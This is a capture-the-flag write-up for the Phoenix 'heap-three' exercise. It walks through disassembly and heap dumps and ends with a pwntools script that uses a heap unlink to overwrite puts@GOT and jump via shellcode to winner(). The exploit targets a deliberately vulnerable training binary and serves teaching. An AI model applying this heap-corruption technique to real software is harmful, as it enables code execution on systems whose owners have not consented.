# &#35; heap-3

#### &#42; pseudocode using ghidra
```bash

undefined4 main(undefined4 param_1,int param_2)

{
  char *__dest;
  char *__dest_00;
  char *__dest_01;
  
  __dest = (char *)malloc(0x20);
  __dest_00 = (char *)malloc(0x20);
  __dest_01 = (char *)malloc(0x20);
  strcpy(__dest,*(char **)(param_2 + 4));
  strcpy(__dest_00,*(char **)(param_2 + 8));
  strcpy(__dest_01,*(char **)(param_2 + 0xc));
  free(__dest_01);
  free(__dest_00);
  free(__dest);
  puts("dynamite failed?");
  return 0;
}


void winner(void)

{
  time_t tVar1;
  
  tVar1 = time((time_t *)0x0);
  printf("Level was successfully completed at @ %ld seconds past the Epoch\n",tVar1);
  return;
}


```


#### &#42; check to binary
```bash
$ file /opt/phoenix/i486/heap-three
/opt/phoenix/i486/heap-three: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/heap-three
[*] '/opt/phoenix/i486/heap-three'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```



#### &#42; how it work
```bash
$ /opt/phoenix/i486/heap-three
Segmentation fault
$ /opt/phoenix/i486/heap-three AAAA
Segmentation fault
$ /opt/phoenix/i486/heap-three AAAA BBBB
Segmentation fault
$ /opt/phoenix/i486/heap-three AAAA BBBB CCCC
dynamite failed?
$

```


#### &#42; vulnerable point
```bash
#### we can overwrite using unlink of heap chunk
```


#### &#42; heap structure
#### chunk-1 : prev[4] + size[4] + data[32]
#### chunk-2 : prev[4] + size[4] + data[32]
#### chunk-3 : prev[4] + size[4] + data[32]
```bash

$ gdb /opt/phoenix/i486/heap-three -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/heap-three...(no debugging symbols found)...done.
gef> disas main
Dump of assembler code for function main:
   0x080487fc <+0>:	lea    ecx,[esp+0x4]
   0x08048800 <+4>:	and    esp,0xfffffff0
   0x08048803 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048806 <+10>:	push   ebp
   0x08048807 <+11>:	mov    ebp,esp
   0x08048809 <+13>:	push   ebx
   0x0804880a <+14>:	push   ecx
   0x0804880b <+15>:	sub    esp,0x10
   0x0804880e <+18>:	mov    ebx,ecx
   0x08048810 <+20>:	sub    esp,0xc
   0x08048813 <+23>:	push   0x20
   0x08048815 <+25>:	call   0x80490e9 <malloc>
   0x0804881a <+30>:	add    esp,0x10
   0x0804881d <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048820 <+36>:	sub    esp,0xc
   0x08048823 <+39>:	push   0x20
   0x08048825 <+41>:	call   0x80490e9 <malloc>
   0x0804882a <+46>:	add    esp,0x10
   0x0804882d <+49>:	mov    DWORD PTR [ebp-0x10],eax
   0x08048830 <+52>:	sub    esp,0xc
   0x08048833 <+55>:	push   0x20
   0x08048835 <+57>:	call   0x80490e9 <malloc>
   0x0804883a <+62>:	add    esp,0x10
   0x0804883d <+65>:	mov    DWORD PTR [ebp-0x14],eax
   0x08048840 <+68>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048843 <+71>:	add    eax,0x4
   0x08048846 <+74>:	mov    eax,DWORD PTR [eax]
   0x08048848 <+76>:	sub    esp,0x8
   0x0804884b <+79>:	push   eax
   0x0804884c <+80>:	push   DWORD PTR [ebp-0xc]
   0x0804884f <+83>:	call   0x8048560 <strcpy@plt>
   0x08048854 <+88>:	add    esp,0x10
   0x08048857 <+91>:	mov    eax,DWORD PTR [ebx+0x4]
   0x0804885a <+94>:	add    eax,0x8
   0x0804885d <+97>:	mov    eax,DWORD PTR [eax]
   0x0804885f <+99>:	sub    esp,0x8
   0x08048862 <+102>:	push   eax
   0x08048863 <+103>:	push   DWORD PTR [ebp-0x10]
   0x08048866 <+106>:	call   0x8048560 <strcpy@plt>
   0x0804886b <+111>:	add    esp,0x10
   0x0804886e <+114>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048871 <+117>:	add    eax,0xc
   0x08048874 <+120>:	mov    eax,DWORD PTR [eax]
   0x08048876 <+122>:	sub    esp,0x8
   0x08048879 <+125>:	push   eax
   0x0804887a <+126>:	push   DWORD PTR [ebp-0x14]
   0x0804887d <+129>:	call   0x8048560 <strcpy@plt>
   0x08048882 <+134>:	add    esp,0x10
   0x08048885 <+137>:	sub    esp,0xc
   0x08048888 <+140>:	push   DWORD PTR [ebp-0x14]
   0x0804888b <+143>:	call   0x8049857 <free>
   0x08048890 <+148>:	add    esp,0x10
   0x08048893 <+151>:	sub    esp,0xc
   0x08048896 <+154>:	push   DWORD PTR [ebp-0x10]
   0x08048899 <+157>:	call   0x8049857 <free>
   0x0804889e <+162>:	add    esp,0x10
   0x080488a1 <+165>:	sub    esp,0xc
   0x080488a4 <+168>:	push   DWORD PTR [ebp-0xc]
   0x080488a7 <+171>:	call   0x8049857 <free>
   0x080488ac <+176>:	add    esp,0x10
   0x080488af <+179>:	sub    esp,0xc
   0x080488b2 <+182>:	push   0x804abc2
   0x080488b7 <+187>:	call   0x80485b0 <puts@plt>
   0x080488bc <+192>:	add    esp,0x10
   0x080488bf <+195>:	mov    eax,0x0
   0x080488c4 <+200>:	lea    esp,[ebp-0x8]
   0x080488c7 <+203>:	pop    ecx
   0x080488c8 <+204>:	pop    ebx
   0x080488c9 <+205>:	pop    ebp
   0x080488ca <+206>:	lea    esp,[ecx-0x4]
   0x080488cd <+209>:	ret
End of assembler dump.
gef>

gef> b *0x0804888b
Breakpoint 1 at 0x804888b
gef> r AAAAAAAAAA BBBBBBBBBB CCCCCCCCCC

gef> vmmap
Start      End        Offset     Perm Path
0x08048000 0x0804c000 0x00000000 r-x /opt/phoenix/i486/heap-three
0x0804c000 0x0804d000 0x00003000 rwx /opt/phoenix/i486/heap-three
0xf7e69000 0xf7f69000 0x00000000 rwx                                  => heap
0xf7f69000 0xf7f6b000 0x00000000 r-- [vvar]
0xf7f6b000 0xf7f6d000 0x00000000 r-x [vdso]
0xf7f6d000 0xf7ffa000 0x00000000 r-x /opt/phoenix/i486-linux-musl/lib/libc.so
0xf7ffa000 0xf7ffb000 0x0008c000 r-x /opt/phoenix/i486-linux-musl/lib/libc.so
0xf7ffb000 0xf7ffc000 0x0008d000 rwx /opt/phoenix/i486-linux-musl/lib/libc.so
0xf7ffc000 0xf7ffe000 0x00000000 rwx
0xfffdd000 0xffffe000 0x00000000 rwx [stack]
gef>
gef> x/52xw 0xf7e69000
0xf7e69000:	0x00000000	0x00000029	0x41414141	0x41414141
0xf7e69010:	0x00004141	0x00000000	0x00000000	0x00000000
0xf7e69020:	0x00000000	0x00000000	0x00000000	0x00000029
0xf7e69030:	0x42424242	0x42424242	0x00004242	0x00000000
0xf7e69040:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69050:	0x00000000	0x00000029	0x43434343	0x43434343
0xf7e69060:	0x00004343	0x00000000	0x00000000	0x00000000
0xf7e69070:	0x00000000	0x00000000	0x00000000	0x000fff89
0xf7e69080:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69090:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e690a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e690b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e690c0:	0x00000000	0x00000000	0x00000000	0x00000000
gef>

```


#### &#42; exploit concept
![unlink](https://github.com/pwn4all/writeup/blob/main/002-phoenix/x86/img/heap_unlink.png?raw=true "unlink")



#### &#42; payload
```bash
#### chunk-1 : prev[4]       + size[4]       + data[32](DUMY)
#### chunk-2 : prev[4](0xff) + size[4](0xff) + data[32](shellcode)
#### chunk-3 : prev[4](-4)   + size[4](-4)   + data[32](0xff)(puts_got-12)(addr_shellcode)

payload1  = b""
payload1 += b"A"*4

payload2  = b""
payload2 += p32(0xffffffff)*4
payload2 += b"\x68\xd5\x87\x04\x08\xc3" # shellcode(jmp winner)
payload2 += b"\xff"*(32-len(payload2))
payload2 += p32(0xfffffffc)*2           # -4(pre and size of chunk3)

payload3  = b""
payload3 += p32(0xffffffff)     # fake size
payload3 += p32(0x0804c13c-12)  # puts_got-12
payload3 += p32(0xf7e69040)     # addr of shellcode

```

#### &#42; exploit code
```bash
$ cat exp_heap3.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/heap-three"

payload1  = b""
payload1 += b"A"*4

## (dis)assembler
## http://shell-storm.org/online/Online-Assembler-and-Disassembler/
payload2  = b""
payload2 += p32(0xffffffff)*4
payload2 += b"\x68\xd5\x87\x04\x08\xc3"
payload2 += b"\xff"*(32-len(payload2))
payload2 += p32(0xfffffffc)*2

payload3  = b""
payload3 += p32(0xffffffff)
payload3 += p32(0x0804c13c-12)  # puts_got-12
payload3 += p32(0xf7e69040)     # addr of shellcode

conn = process([filename, payload1, payload2, payload3])

conn.interactive()


$ python exp_heap3.py
[+] Starting local process '/opt/phoenix/i486/heap-three': pid 672
[*] Switching to interactive mode
[*] Process '/opt/phoenix/i486/heap-three' stopped with exit code 0 (pid 672)
Level was successfully completed at @ 1638351859 seconds past the Epoch
[*] Got EOF while reading in interactive
$

```


